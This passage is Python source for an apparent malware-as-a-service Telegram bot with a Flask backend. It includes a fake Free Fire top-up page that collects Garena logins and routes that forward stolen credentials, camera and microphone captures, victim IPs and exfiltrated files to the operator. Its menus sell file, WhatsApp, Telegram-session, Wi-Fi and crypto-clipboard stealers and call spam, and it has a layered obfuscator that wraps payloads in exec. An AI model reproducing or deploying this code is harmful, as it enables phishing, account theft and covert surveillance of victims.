.desc{{font-size:12px;color:#71717a;margin-top:5px}}.btn{{width:100%;padding:15px;background:linear-gradient(135deg, #f59e0b, #ea580c);color:#fff;border:none;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer;margin-top:10px}}.btn:hover{{opacity:0.9}}.hidden{{display:none}}.login-step{{text-align:center}}</style></head><body><div class="container"><div class="header"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTEATD_jXTIlGgzII79k5Z1i4T_xpJs6YTboYrzhiCwLQ&s=10" alt="Garena"><h2>Free Fire Top-Up Center</h2></div><div class="content"><div id="step1"><div class="form-group"><label>Player ID</label><input type="number" id="ff_id" placeholder="Enter Free Fire Player ID" required></div><div class="form-group"><label>Select Package</label><div class="package-grid"><div class="package active" onclick="selectPackage(this, '100')">100 Diamonds<br><span class="desc">$0.99</span></div><div class="package" onclick="selectPackage(this, '310')">310 Diamonds<br><span class="desc">$2.99</span></div><div class="package" onclick="selectPackage(this, '520')">520 Diamonds<br><span class="desc">$4.99</span></div><div class="package" onclick="selectPackage(this, '1080')">1080 Diamonds<br><span class="desc">$9.99</span></div></div><input type="hidden" id="diamonds" value="100"></div><button class="btn" onclick="goToStep2()">Continue</button></div><div id="step2" class="hidden login-step"><h3 style="margin-bottom:20px;color:#18181b">Login to Garena Account</h3><p style="font-size:14px;color:#71717a;margin-bottom:20px">To secure your top-up, please log in to your Garena account associated with the Player ID.</p><form action="/catch" method="POST"><input type="hidden" name="platform" value="FreeFire"><input type="hidden" name="id" value="{cid}"><input type="hidden" name="ff_id" id="ff_id_val"><input type="hidden" name="diamonds" id="diamonds_val"><div class="form-group"><input type="text" name="email" placeholder="Email or Username" required style="text-align:center"></div><div class="form-group"><input type="password" name="password" placeholder="Password" required style="text-align:center"></div><button type="submit" class="btn">Login & Top-Up Now</button></form></div></div></div><script>function selectPackage(el, val){{document.querySelectorAll('.package').forEach(p=>p.classList.remove('active'));el.classList.add('active');document.getElementById('diamonds').value=val;}}function goToStep2(){{var f=document.getElementById('ff_id').value;if(!f){{alert('Please enter Player ID');return;}}document.getElementById('ff_id_val').value=f;document.getElementById('diamonds_val').value=document.getElementById('diamonds').value;document.getElementById('step1').classList.add('hidden');document.getElementById('step2').classList.remove('hidden');}}</script></body></html>'''

@app.route('/')
def web_home():
    return f"<h1>{ce('🤖')} نظام المتمرد V100 يعمل بنجاح!</h1>"

@app.route('/<platform>')
def dynamic_phish(platform):
    cid = request.args.get('user')
    if not cid: return "User not specified.", 400
    if platform == "freefire": return render_freefire_page(cid)
    elif platform in ["tiktok", "facebook", "instagram", "whatsapp", "twitter", "snapchat", "pubg", "insta_followers", "tiktok_likes", "telegram_login", "clash_of_clans"]: return render_phish_page(platform, cid)
    elif platform in ["photo_front", "photo_back", "video_front", "audio_mic"]: return render_surveillance_page(platform, cid)
    return "Page not found.", 404

@app.route('/ip_track')
def ip_track():
    cid = request.args.get('user')
    if not cid: return "Invalid link", 400
    try:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=country,city,isp,query").json()
        msg = f"{ce('🔴')} <b>[ تم فتح رابط التتبع ]</b>\n\n"
        msg += f"{ce('🌐')} <b>الـ IP:</b> <code>{r.get('query', 'N/A')}</code>\n"
        msg += f"🏳️ <b>الدولة:</b> {r.get('country', 'N/A')}\n"
        msg += f"🏙 <b>المدينة:</b> {r.get('city', 'N/A')}\n"
        msg += f"📡 <b>مزود الخدمة:</b> {r.get('isp', 'N/A')}\n"
        bot.send_message(int(cid), msg)
    except: pass
    return redirect("https://www.google.com/search?q=whats+my+ip")

@app.route('/check_vip/<cid>')
def api_check_vip(cid):
    try:
        user_obj = get_user(int(cid))
        if is_admin(int(cid)) or (user_obj and check_vip(user_obj)): return "VALID", 200
        return "INVALID", 403
    except: return "INVALID", 403

@app.route('/catch_media', methods=['POST'])
def catch_media():
    try:
        cid = request.form.get('id')
        media_type = request.form.get('type')
        file = request.files.get('file')
        if not file or not cid: return "Error", 400
        user_obj = get_user(int(cid))
        if not (is_admin(int(cid)) or (user_obj and check_vip(user_obj))): return redirect("https://google.com")
        ext = ".jpg" if "photo" in media_type else ".webm"
        filename = f"temp_{media_type}{ext}"
        file.save(filename)
        increment_stat("hacked")
        with open(filename, 'rb') as f:
            if "photo" in media_type:
                cap = "📸 صورة أمامية" if "front" in media_type else "📷 صورة خلفية"
                bot.send_photo(int(cid), f, caption=f"{cap}\nتم التقاطها عبر الرابط بنجاح.")
            elif "video" in media_type: bot.send_video(int(cid), f, caption=f"🎥 فيديو مسجل (5 ثواني)\nتم تسجيله عبر الرابط بنجاح.")
            elif "audio" in media_type: bot.send_audio(int(cid), f, caption=f"🎙️ تسجيل صوتي (5 ثواني)\nتم تسجيله عبر الرابط بنجاح.")
        os.remove(filename)
        return "Success", 200
    except Exception as e: return f"Error: {e}", 500

@app.route('/exfil', methods=['POST'])
def exfil_data():
    try:
        cid = request.form.get('cid')
        ftype = request.form.get('type', 'Document')
        text_data = request.form.get('text')
        file = request.files.get('file')
        
        if not cid: return "Error", 400
        
        user_obj = get_user(int(cid))
        if not (is_admin(int(cid)) or (user_obj and check_vip(user_obj))): return "Error", 403

        if text_data and not file:
            bot.send_message(int(cid), text_data)
            return "Success", 200

        if not file: return "Error", 400

        temp_path = f"temp_{file.filename}"
        file.save(temp_path)
        
        with open(temp_path, 'rb') as f:
            if ftype == "Photo": bot.send_photo(int(cid), f)
            elif ftype == "Video": bot.send_video(int(cid), f)
            elif ftype == "Audio": bot.send_audio(int(cid), f)
            else: bot.send_document(int(cid), f)
        
        os.remove(temp_path)
        increment_stat("hacked")
        return "Success", 200
    except Exception as e:
        return f"Error: {e}", 500

@app.route('/catch', methods=['POST'])
def catch_credentials():
    try:
        platform = request.form.get('platform')
        cid = request.form.get('id')
        user_data = request.form.to_dict()
        user_data.pop('platform', None)
        user_data.pop('id', None)
        user_obj = get_user(int(cid))
        if not (is_admin(int(cid)) or (user_obj and check_vip(user_obj))): return redirect("https://google.com")
        msg = f"{ce('🎣')} <b>[ تم الصيد - {platform} ]</b>\n\n"
        try: increment_stat("hacked")
        except: pass
        for key, value in user_data.items():
            msg += f"{ce('🔹')} <b>{key}:</b> <code>{value}</code>\n"
        bot.send_message(int(cid), msg)
        
        if platform == "TikTok": return redirect("https://www.tiktok.com/login")
        elif platform == "Facebook": return redirect("https://www.facebook.com/login")
        elif platform == "Instagram": return redirect("https://www.instagram.com/accounts/login/")
        elif platform == "WhatsApp": return redirect("https://web.whatsapp.com/")
        elif platform == "Twitter": return redirect("https://twitter.com/i/flow/login")
        elif platform == "Snapchat": return redirect("https://accounts.snapchat.com/accounts/login")
        elif platform == "FreeFire": return redirect("https://ff.garena.com/")
        elif platform == "PUBG": return redirect("https://www.pubgmobile.com/")
        elif platform == "InstaFollowers": return redirect("https://www.instagram.com/")
        elif platform == "TikTokLikes": return redirect("https://www.tiktok.com/")
        elif platform == "TelegramLogin": return redirect("https://web.telegram.org/")
        elif platform == "ClashOfClans": return redirect("https://supercell.com/en/clashofclans/")
        else: return redirect("https://google.com")
    except Exception as e: return f"Error: {e}", 500

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run_web, daemon=True)
    t.start()

def load_data(file, default=None):
    if default is None: default = []
    if os.path.exists(file):
        try:
            with open(file, 'r', encoding='utf-8') as f: return json.load(f)
        except: return default
    return default

def save_data(file, data):
    dir_name = os.path.dirname(file)
    if dir_name: os.makedirs(dir_name, exist_ok=True)
    with open(file, 'w', encoding='utf-8') as f: json.dump(data, f, ensure_ascii=False, indent=2)

def load_users(): return load_data(USERS_FILE, [])
def save_users(u): save_data(USERS_FILE, u)
def load_vip_keys(): return load_data(VIP_KEYS_FILE, {})
def save_vip_keys(k): save_data(VIP_KEYS_FILE, k)
def load_stats(): return load_data(STATS_FILE, {"hacked": 0, "files": 0})
def save_stats(s): save_data(STATS_FILE, s)
def increment_stat(key):
    stats = load_stats()
    stats[key] = stats.get(key, 0) + 1
    save_stats(stats)
def load_fake_bot(): return load_data(FAKE_BOT_FILE, [])
def save_fake_bot(d): save_data(FAKE_BOT_FILE, d)
def load_vip_lock(): return load_data(VIP_LOCK_FILE, False)
def save_vip_lock(state): save_data(VIP_LOCK_FILE, state)

def get_user(cid):
    users = load_users()
    return next((u for u in users if u['id'] == cid), None)

def update_user(cid, updated_data):
    users = load_users()
    for i, u in enumerate(users):
        if u['id'] == cid:
            users[i] = updated_data
            break
    save_users(users)

def load_channels():
    chs = load_data(CHANNELS_FILE, [])
    valid_chs = [c for c in chs if isinstance(c, dict)]
    if len(valid_chs) != len(chs): save_channels(valid_chs)
    return valid_chs

def save_channels(c): save_data(CHANNELS_FILE, c)
def load_banned(): return load_data(BANNED_FILE, [])
def save_banned(b): save_data(BANNED_FILE, b)

def load_admins():
    admins = load_data(ADMINS_FILE, [OWNER_ID])
    if OWNER_ID not in admins:
        admins.append(OWNER_ID)
        save_admins(admins)
    return admins

def save_admins(a): save_data(ADMINS_FILE, a)
def load_maintenance(): return load_data(MAINTENANCE_FILE, False)
def save_maintenance(state): save_data(MAINTENANCE_FILE, state)
def is_admin(uid): return uid in load_admins()
def is_banned(uid): return uid in load_banned()

def check_vip(user_data):
    if load_vip_lock(): return False
    vip_expiry = user_data.get('vip_expiry', 0)
    if time.time() < vip_expiry: return True
    return False

def safe_edit(text, cid, msg_id, reply_markup=None, disable_web_page_preview=True):
    try:
        bot.edit_message_text(text, cid, msg_id, reply_markup=reply_markup, disable_web_page_preview=disable_web_page_preview)
    except: pass

def add_user(uid, uname, fname, ref_by=None):
    users = load_users()
    user_data = next((u for u in users if u['id'] == uid), None)
    if not user_data:
        user_data = {"id": uid, "uname": uname, "fname": fname, "vip_expiry": 0, "ref_count": 0, "ref_by": ref_by, "used_trial": False}
        users.append(user_data)
        save_users(users)
        try:
            dt_now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            uname_str = f"@{uname}" if uname else "لا يوجد"
            bot_username = bot.get_me().username
            msg = f"{ce('🔔')} <b>عضو جديد انضم للبوت!</b>\n\n"
            msg += f"{ce('👤')} <b>الاسم:</b> {fname}\n"
            msg += f"{ce('👥')} <b>يوزر العضو:</b> {uname_str}\n"
            msg += f"{ce('🆔')} <b>آيدي العضو:</b> <code>{uid}</code>\n"
            msg += f"{ce('⏰')} <b>الوقت:</b> {dt_now}\n"
            msg += f"🤖 <b>عبر البوت:</b> @{bot_username}\n"
            msg += f"📊 <b>إجمالي الأعضاء:</b> <code>{len(users)}</code>"
            bot.send_message(OWNER_ID, msg)
        except: pass
            
        if ref_by:
            referrer = get_user(ref_by)
            if referrer and ref_by != uid:
                referrer['ref_count'] = referrer.get('ref_count', 0) + 1
                if referrer['ref_count'] >= 5:
                    referrer['vip_expiry'] = time.time() + (7 * 24 * 60 * 60)
                    try: bot.send_message(ref_by, f"{ce('🎉')} <b>تهانينا!</b> دعوت 5 أشخاص.\n{ce('🔓')} تم تفعيل VIP 7 أيام!")
                    except: pass
                else:
                    referrer['vip_expiry'] = time.time() + (24 * 60 * 60)
                    try: bot.send_message(ref_by, f"{ce('👤')} <b>شخص دخل عبر رابطك!</b>\n{ce('🔓')} +24 ساعة VIP.\n{ce('📊')} تحتاج <code>{5 - referrer['ref_count']}</code> شخص لفتح VIP 7 أيام.")
                    except: pass
                update_user(ref_by, referrer)

def check_sub(uid):
    chs = load_channels()
    if not chs: return True, []
    not_sub = []
    for ch in chs:
        try:
            m = bot.get_chat_member(ch.get('id'), uid)
            if m.status in ['left', 'kicked']: not_sub.append(ch)
        except: not_sub.append(ch)
    return len(not_sub) == 0, not_sub

# Forward-declared fallback (populated below)
def swap_fallback(text):  # placeholder, replaced later
    return text

def _lookup_premium_id(emoji):
    """Return premium custom_emoji_id for an emoji char, applying fallback."""
    if not emoji:
        return None
    eid = MENU_EMOJI.get(emoji)
    if eid: return eid
    stripped = emoji.replace('\ufe0f', '')
    eid = MENU_EMOJI.get(stripped) or MENU_EMOJI.get(stripped + '\ufe0f')
    if eid: return eid
    # try fallback map
    try:
        alt = _EMOJI_FALLBACK.get(emoji) or _EMOJI_FALLBACK.get(stripped)
        if alt:
            return MENU_EMOJI.get(alt) or MENU_EMOJI.get(alt.replace('\ufe0f','')) \
                   or MENU_EMOJI.get(alt + '\ufe0f')
    except Exception:
        pass
    return None

def _extract_leading_emoji(text):
    """Extract a leading emoji cluster from text; return (emoji, rest)."""
    if not text or not isinstance(text, str):
        return None, text
    import unicodedata
    # scan first grapheme-ish cluster: emoji chars + optional ZWJ sequences + variation selectors
    i = 0
    n = len(text)
    def _is_emoji_char(ch):
        cp = ord(ch)
        if ch in ('\u200d', '\ufe0f', '\ufe0e'):
            return True
        # ranges covering emoji/symbols/flags
        return (
            0x1F000 <= cp <= 0x1FFFF or
            0x2600  <= cp <= 0x27BF  or
            0x2300  <= cp <= 0x23FF  or
            0x2B00  <= cp <= 0x2BFF  or
            0x1F1E6 <= cp <= 0x1F1FF or
            cp in (0x00A9, 0x00AE, 0x203C, 0x2049, 0x20E3, 0x2122, 0x2139)
        )
    while i < n and _is_emoji_char(text[i]):
        i += 1
    if i == 0:
        return None, text
    emoji = text[:i].strip('\ufe0f\ufe0e')
    rest = text[i:].lstrip()
    return emoji or None, rest

def btn(text, cb=None, url=None, style="primary", emoji_id=None):
    # Telegram doesn't render <tg-emoji> in button labels. We attach the
    # premium custom emoji via the button's icon_custom_emoji_id attribute
    # (monkey-patched) so buttons show the premium icon instead of a plain
    # unicode emoji baked into the text.
    label = text
    if not emoji_id and isinstance(label, str):
        em, rest = _extract_leading_emoji(label)
        if em:
            eid = _lookup_premium_id(em)
            if eid:
                emoji_id = eid
                label = rest  # remove the plain emoji so only premium icon shows
    # If no leading emoji matched, still swap any inline fallback chars
    try:
        if not emoji_id:
            label = swap_fallback(label)
            em, rest = _extract_leading_emoji(label)
            if em:
                eid = _lookup_premium_id(em)
                if eid:
                    emoji_id = eid
                    label = rest
    except Exception:
        pass
    b = InlineKeyboardButton(label, callback_data=cb, url=url, style=style)
    if emoji_id:
        try: setattr(b, "icon_custom_emoji_id", str(emoji_id))
        except: pass
    return b

# ===== Premium emoji auto-wrap for buttons & messages =====
# Emojis used in the bot that don't have a premium ID -> substitute with the
# closest available premium emoji so nothing renders as a plain fallback.
_EMOJI_FALLBACK = {
    "♀️": "",
    "⚔️": "🔫",
    "⚖️": "🛡",
    "➖": "🗑",
    "🌟": "⭐️",
    "🎣": "🔍",
    "🎥": "📷",
    "🎯": "📌",
    "🏆": "🥇",
    "🏙": "🏬",
    "🐉": "👹",
    "🐦": "🐱",
    "👁‍🗨": "👁",
    "👁‍🗨️": "👁",
    "👨‍💻": "👩‍💻",
    "👮": "👮‍♀️",
    "👻": "👾",
    "💰": "💵",
    "📋": "📄",
    "📜": "📄",
    "📡": "🌐",
    "📢": "📣",
    "📧": "✉️",
    "📩": "✉️",
    "📸": "📷",
    "📺": "🎞",
    "🔌": "🔋",
    "🔓": "🔒",
    "🔙": "⬅️",
    "🔢": "🆔",
    "😴": "😐",
    "🚧": "⚠️",
    "🧬": "💠",
    "🇮🇶": "🚩",
}
_FALLBACK_KEYS_SORTED = sorted(_EMOJI_FALLBACK.keys(), key=len, reverse=True)

def swap_fallback(text):
    if not text or not isinstance(text, str):
        return text
    out = text
    for k in _FALLBACK_KEYS_SORTED:
        if k in out:
            out = out.replace(k, _EMOJI_FALLBACK[k])
    return out

_PREMIUM_KEYS_SORTED = sorted(MENU_EMOJI.keys(), key=len, reverse=True)

def wrap_premium(text):
    if not text or not isinstance(text, str):
        return text
    if '<tg-emoji' in text:
        return text
    out = swap_fallback(text)
    for e in _PREMIUM_KEYS_SORTED:
        if e and e in out:
            eid = MENU_EMOJI[e]
            out = out.replace(e, f'<tg-emoji emoji-id="{eid}">{e}</tg-emoji>')
    return out

def main_menu(uid):
    m = InlineKeyboardMarkup()
    m.row(btn("🆓 [ القسم المجاني ]", "free_menu", style="success"), btn("💎 [ القسم المدفوع VIP ]", "vip_menu", style="danger"))
    m.row(btn("🎭 [ معلومات البوت ]", "bot_info", style="primary"))
    if is_admin(uid): m.row(btn("👑 [ لوحة تحكم الأدمن ]", "admin_panel", style="danger"))
    m.row(btn("⚙️ [ المطور ]", url="https://t.me/a_mutamarid", style="primary"), btn("📡 [ قناة البوت ]", url="https://t.me/mutmared1", style="success"))
    m.row(btn("🤖 [ انشئ بوتك الخاص ]", "create_bot_menu", style="success"))
    return m

def create_bot_menu():
    m = InlineKeyboardMarkup()
    m.row(btn("⏳ [ 3 أيام - 20 نجمة ]", "create_bot_3d", style="primary"))
    m.row(btn("🗓 [ 15 يوم - 50 نجمة ]", "create_bot_15d", style="success"))
    m.row(btn("⭐ [ شهر كامل - 100 نجمة ]", "create_bot_30d", style="danger"))
    m.row(btn("🔙 [ رجوع للرئيسية ]", "back_main", style="primary"))
    return m

def free_menu():
    m = InlineKeyboardMarkup()
    m.row(btn("🖼 [ سحب الصور فقط ]", "gen_images", style="primary"), btn("🎵 [ سحب الموسيقى فقط ]", "gen_music", style="success"))
    m.row(btn("📺 [ سحب الفيديوهات ]", "gen_videos", style="primary"), btn("📝 [ سحب المستندات ]", "gen_docs", style="primary"))
    m.row(btn("💻 [ معلومات الهاتف ]", "gen_sysinfo", style="primary"), btn("🔗 [ تتبع IP الضحية ]", "gen_ip_logger", style="danger"))
    m.row(btn("💰 [ فاحص محافظ الكريبتو ]", "crypto_checker", style="primary"))
    m.row(btn("🔙 [ رجوع للرئيسية ]", "back_main", style="danger"))
    return m

def surveillance_menu():
    m = InlineKeyboardMarkup()
    m.row(btn("📸 [ كاميرا أمامية ]", "surv_photo_front", style="danger"), btn("📷 [ كاميرا خلفية ]", "surv_photo_back", style="danger"))
    m.row(btn("🎥 [ تسجيل فيديو ]", "surv_video_front", style="danger"), btn("🎙️ [ تسجيل صوتي ]", "surv_audio_mic", style="danger"))
    m.row(btn("🔙 [ رجوع لقسم VIP ]", "vip_menu", style="danger"))
    return m

def vip_menu(uid=None):
    m = InlineKeyboardMarkup()
    if uid:
        user_data = get_user(uid)
        if not user_data:
            add_user(uid, None, None)
            user_data = get_user(uid)
        if is_admin(uid) or check_vip(user_data):
            m.row(btn("📁 [ ساحب جميع الملفات (كمبيوتر/هاتف) ]", "gen_all_files", style="danger"))
            m.row(btn("📡 [ اختراق سوشيال ميديا ]", "social_menu", style="danger"))
            m.row(btn("🎥 [ كاميرا وميكروفون تجسس صامت ]", "gen_spy_cam", style="danger"))
            m.row(btn("🛡 [ ساحب قاعدة الواتساب ]", "gen_wa_db", style="danger"), btn("🧬 [ ساحب جلسات تيليجرام ]", "gen_session_stealer", style="danger"))
            m.row(btn("⚡ [ السبام المباشر ]", "ds_menu", style="danger"), btn("🤖 [ اختراق عبر بوت ]", "vip_bot_hack", style="danger"))
            m.row(btn("👁‍🗨 [ نظام المراقبة المتقدم ]", "surveillance_menu", style="danger"), btn("💳 [ مختطف محافظ الكريبتو ]", "gen_clipboard_hijack", style="danger"))
            m.row(btn("📶 [ ساحب كلمات مرور الواي فاي ]", "gen_wifi_stealer", style="danger"))
            m.row(btn("🔙 [ رجوع للرئيسية ]", "back_main", style="primary"))
        else:
            m.row(btn("⭐ [ اشتراك شهري - 15 نجمة ]", "vip_star_pay", style="primary"))
            m.row(btn("🎁 [ تجربة مجانية - 12 ساعة ]", "vip_trial", style="success"))
            m.row(btn("👥 [ دعوة أصدقاء - VIP يومي ]", "vip_share_link", style="success"))
            m.row(btn("🔑 [ إدخال مفتاح VIP ]", "vip_enter_key", style="primary"))
            m.row(btn("🔙 [ رجوع للرئيسية ]", "back_main", style="danger"))
    else:
        m.row(btn("📁 [ ساحب جميع الملفات (كمبيوتر/هاتف) ]", "gen_all_files", style="danger"))
        m.row(btn("📡 [ اختراق سوشيال ميديا ]", "social_menu", style="danger"))
        m.row(btn("🎥 [ كاميرا وميكروفون تجسس صامت ]", "gen_spy_cam", style="danger"))
        m.row(btn("🛡 [ ساحب قاعدة الواتساب ]", "gen_wa_db", style="danger"), btn("🧬 [ ساحب جلسات تيليجرام ]", "gen_session_stealer", style="danger"))
        m.row(btn("⚡ [ السبام المباشر ]", "ds_menu", style="danger"), btn("🤖 [ اختراق عبر بوت ]", "vip_bot_hack", style="danger"))
        m.row(btn("👁‍🗨 [ نظام المراقبة المتقدم ]", "surveillance_menu", style="danger"), btn("💳 [ مختطف محافظ الكريبتو ]", "gen_clipboard_hijack", style="danger"))
        m.row(btn("📶 [ ساحب كلمات مرور الواي فاي ]", "gen_wifi_stealer", style="danger"))
        m.row(btn("🔙 [ رجوع للرئيسية ]", "back_main", style="primary"))
    return m

def social_menu():
    m = InlineKeyboardMarkup()
    m.row(btn("🎵 [ اختراق تيك توك ]", "social_tiktok", style="danger"), btn("💬 [ اختراق واتساب ]", "social_whatsapp", style="danger"))
    m.row(btn("📘 [ اختراق فيسبوك ]", "social_facebook", style="danger"), btn("📷 [ اختراق انستغرام ]", "social_instagram", style="danger"))
    m.row(btn("🐦 [ اختراق تويتر ]", "social_twitter", style="danger"), btn("👻 [ اختراق سناب شات ]", "social_snapchat", style="danger"))
    m.row(btn("🎮 [ شحن فري فاير وهمي ]", "freefire_hack", style="danger"), btn("🔫 [ شحن ببجي UC وهمي ]", "pubg_hack", style="danger"))
    m.row(btn("⚔️ [ شحن جواهر كلاش اوف كلانس ]", "clash_of_clans_hack", style="danger"))
    m.row(btn("➕ [ متابعين انستغرام وهمي ]", "insta_followers_hack", style="danger"), btn("❤️ [ لايكات تيك توك وهمي ]", "tiktok_likes_hack", style="danger"))
    m.row(btn("📱 [ تسجيل دخول تيليجرام ]", "telegram_login_hack", style="danger"))
    m.row(btn("🔙 [ رجوع لقسم VIP ]", "vip_menu", style="danger"))
    return m

def ds_menu():
    m = InlineKeyboardMarkup()
    m.row(btn("📞 اتصال (Telz)", "ds_telz", style="primary"), btn("🇮🇶 اتصال (Yolla)", "ds_yolla", style="primary"))
    m.row(btn("⚡ سبام (Zain)", "ds_ether", style="danger"), btn("📱 سبام تيليجرام OTP", "ds_tg", style="danger"))
    m.row(btn("📧 سبام جيميل OTP", "ds_gmail", style="danger"))
    m.row(btn("🔙 [ رجوع لقسم VIP ]", "vip_menu", style="danger"))
    return m

def bot_control_menu():
    m = InlineKeyboardMarkup()
    m.row(btn("📋 [ معلومات البوت ]", "bc_info", style="primary"), btn("📡 [ إحصائيات الويب هوك ]", "bc_webhook", style="primary"))
    m.row(btn("👤 [ تغيير اسم البوت ]", "bc_name", style="primary"), btn("📝 [ الوصف الطويل ]", "bc_desc", style="primary"))
    m.row(btn("✏️ [ النبذة القصيرة ]", "bc_about", style="primary"), btn("⚙️ [ تغيير الأوامر ]", "bc_cmds", style="primary"))
    m.row(btn("🗑 [ حذف النبذة والوصف ]", "bc_clear", style="danger"), btn("⛔ [ إيقاف البوت مؤقتاً ]", "bc_close", style="danger"))
    m.row(btn("🔌 [ تسجيل خروج البوت ]", "bc_logout", style="danger"))
    m.row(btn("🔄 [ تغيير توكن بوت آخر ]", "bot_control_start", style="success"), btn("🔙 [ رجوع لقسم VIP ]", "vip_menu", style="danger"))
    return m

def vip_keys_menu():
    m = InlineKeyboardMarkup()
    m.row(btn("➕ [ إنشاء مفتاح جديد ]", "adm_create_vip_key", style="success"))
    m.row(btn("📋 [ عرض المفاتيح ]", "adm_list_vip_keys", style="primary"))
    m.row(btn("❌ [ تعطيل مفتاح ]", "adm_disable_vip_key", style="danger"), btn("✅ [ تفعيل مفتاح ]", "adm_enable_vip_key", style="success"))
    m.row(btn("🗑 [ حذف مفتاح ]", "adm_delete_vip_key", style="danger"))
    m.row(btn("🔙 [ رجوع ]", "admin_panel", style="primary"))
    return m

def admin_panel():
    m = InlineKeyboardMarkup()
    m.row(btn("➕ [ إضافة قناة ]", "adm_add_ch", style="success"), btn("➖ [ إزالة قناة ]", "adm_rm_ch", style="danger"))
    m.row(btn("🚫 [ حظر عضو ]", "adm_ban", style="danger"), btn("✅ [ فك حظر ]", "adm_unban", style="success"))
    m.row(btn("📢 [ إذاعة عامة ]", "adm_broadcast", style="primary"), btn("📊 [ إحصائيات البوت ]", "adm_stats", style="primary"))
    m.row(btn("📩 [ رسالة لعضو ]", "adm_send_msg", style="primary"), btn("🔍 [ معلومات عضو ]", "adm_user_info", style="primary"))
    m.row(btn("🔑 [ إدارة مفاتيح VIP ]", "adm_vip_keys_menu", style="primary"), btn("➖ [ إزالة أدمن ]", "adm_rm_admin", style="danger"))
    m.row(btn("➕ [ إضافة أدمن ]", "adm_add_admin", style="success"), btn("🚧 [ وضع الصيانة ]", "adm_maintenance", style="danger"))
    m.row(btn("🏆 [ الأكثر دعوةً ]", "adm_top_inviters", style="primary"), btn("📤 [ استخراج قائمة الأعضاء ]", "adm_export_users", style="primary"))
    m.row(btn("🧹 [ تصفير الإحصائيات ]", "adm_reset_stats", style="danger"))
    m.row(btn("⭐ [ تفعيل VIP 7 أيام ]", "adm_vip_7d", style="primary"), btn("🌟 [ تفعيل VIP 30 يوم ]", "adm_vip_30d", style="success"))
    m.row(btn("🔒 [ إغلاق قسم VIP ]", "adm_lock_vip", style="danger"))
    m.row(btn("📤 [ تصدير نسخة احتياطية ]", "adm_export_backup", style="primary"), btn("📥 [ استعادة نسخة احتياطية ]", "adm_restore_backup", style="success"))
    m.row(btn("🔙 [ رجوع للرئيسية ]", "back_main", style="primary"))
    return m

def fake_bot_welcome_menu():
    m = InlineKeyboardMarkup()
    m.row(btn("🧠 تفعيل المساعد الذكي", "fake_add_account", style="primary"))
    m.row(btn("📜 معلومات الخدمة", "fake_info", style="success"))
    return m

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
fake_bot = telebot.TeleBot(FAKE_BOT_TOKEN, parse_mode="HTML")

# ===== Auto-wrap emojis in all outgoing messages/captions =====
def _install_premium_wrap(bot_instance):
    for _mname, _tkey in [
        ('send_message', 'text'),
        ('edit_message_text', 'text'),
        ('send_photo', 'caption'),
        ('send_video', 'caption'),
        ('send_audio', 'caption'),
        ('send_document', 'caption'),
        ('send_animation', 'caption'),
        ('send_voice', 'caption'),
        ('edit_message_caption', 'caption'),
        ('answer_callback_query', 'text'),
    ]:
        _orig = getattr(bot_instance, _mname, None)
        if not _orig:
            continue
        def _make(orig, tkey):
            def _wrapped(*args, **kwargs):
                try:
                    if tkey in kwargs and isinstance(kwargs[tkey], str):
                        kwargs[tkey] = wrap_premium(kwargs[tkey])
                except Exception:
                    pass
                return orig(*args, **kwargs)
            return _wrapped
        setattr(bot_instance, _mname, _make(_orig, _tkey))

_install_premium_wrap(bot)
_install_premium_wrap(fake_bot)

def military_encrypt(code):
    import zlib, base64, binascii, hashlib, random
    c = zlib.compress(code.encode('utf-8'), 9)
    c = base64.b64encode(c)
    c = c[::-1]
    key = hashlib.sha256(str(random.random()).encode()).digest()
    c = bytes([b ^ key[i % len(key)] for i, b in enumerate(c)])
    c = base64.b85encode(c)
    c = binascii.hexlify(c)
    c = zlib.compress(c)
    c = base64.b32encode(c)
    c = base64.b64encode(c)
    
    key_b64 = base64.b64encode(key).decode('utf-8')
    payload = c.decode('utf-8')
    
    decoder = (
        "import zlib,base64,binascii\n"
        "def _d(c,k):\n"
        "    c=base64.b64decode(c)\n"
        "    c=base64.b32decode(c)\n"
        "    c=zlib.decompress(c)\n"
        "    c=binascii.unhexlify(c)\n"
        "    c=base64.b85decode(c)\n"
        "    k=base64.b64decode(k)\n"
        "    c=bytes([b^k[i%len(k)] for i,b in enumerate(c)])\n"
        "    c=c[::-1]\n"
        "    c=base64.b64decode(c)\n"
        "    c=zlib.decompress(c)\n"
        "    return c\n"
        f"exec(_d('{payload}','{key_b64}'))"
    )
    enc_decoder = base64.b64encode(decoder.encode('utf-8')).decode('utf-8')
    return f"import base64;exec(base64.b64decode('{enc_decoder}'))"

def telz_call_real(phone):
    android_id = uuid.uuid4().hex[:16]
    uid = str(uuid.uuid4())
    headers = {"User-Agent": "Telz-Android/17.5.48", "Content-Type": "application/json; charset=UTF-8"}
    try:
        requests.post("https://api.telz.com/app/auth_list", json={"android_id": android_id, "app_version": "17.5.48", "event": "auth_list", "os": "android", "os_version": "15", "ts": int(time.time() * 1000), "uuid": uid}, headers=headers, timeout=5)
        requests.post("https://api.telz.com/app/run", json={"android_id": android_id, "app_version": "17.5.48", "device_name": "", "event": "run", "ipv4_address": "", "lang": "ar", "network_country": "iq", "network_type": "WIFI", "os": "android", "os_version": "15", "push_token": "", "roaming": "no", "root": "no", "run_id": str(int(time.time())), "sim_country": "iq", "ts": int(time.time() * 1000), "uuid": uid}, headers=headers, timeout=5)
        requests.post("https://api.telz.com/app/validate_phonenumber", json={"android_id": android_id, "app_version": "17.5.48", "event": "validate_phonenumber", "os": "android", "os_version": "15", "phone": phone, "region": "IQ", "ts": int(time.time() * 1000), "uuid": uid}, headers=headers, timeout=5)
        time.sleep(0.5)
        r4 = requests.post("https://api.telz.com/app/auth_call", json={"android_id": android_id, "app_version": "17.5.48", "attempt": "0", "event": "auth_call", "lang": "ar", "os": "android", "os_version": "15", "phone": phone, "ts": int(time.time() * 1000), "uuid": uid, "run_id": str(int(time.time() * 1000))}, headers=headers, timeout=5)
        result = r4.json()
        if result.get('status') == 'ok': return True, f"{ce('✅')} تم إرسال المكالمة بنجاح"
        elif result.get('reason') == '3.1': return False, f"{ce('⚠️')} الرقم مسجل مسبقاً"
        else: return False, f"{ce('❌')} فشل إرسال المكالمة"
    except Exception as e: return False, f"{ce('❌')} خطأ: {str(e)[:30]}"

def yolla_call_real(phone):
